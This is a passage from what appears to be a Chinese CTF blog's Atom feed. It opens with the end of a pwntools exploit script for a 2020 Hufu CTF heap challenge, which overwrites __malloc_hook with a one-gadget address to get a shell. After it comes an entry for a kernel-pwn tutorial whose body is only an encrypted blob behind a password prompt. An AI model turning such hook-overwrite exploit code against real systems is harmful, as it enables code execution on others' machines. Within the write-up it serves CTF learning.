class="number">3</span>]</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">new(<span class="number">0x7FFFFFFF00000000</span>+<span class="number">0xFF0</span>)</span><br><span class="line">rand_1 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">rand_2 =p.recv(<span class="number">24</span>).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">randq_1 = <span class="string">''</span></span><br><span class="line">randq_2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>,<span class="number">-1</span>,<span class="number">-2</span>):</span><br><span class="line">randq_1 += (rand_1[i<span class="number">-1</span>] + rand_1[i])</span><br><span class="line">randq_2 += (rand_2[i<span class="number">-1</span>] + rand_2[i])</span><br><span class="line">rceq = (int(randq_1,<span class="number">16</span>) ^ rce)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">reallocq = (int(randq_2,<span class="number">16</span>) ^ realloc)&amp;<span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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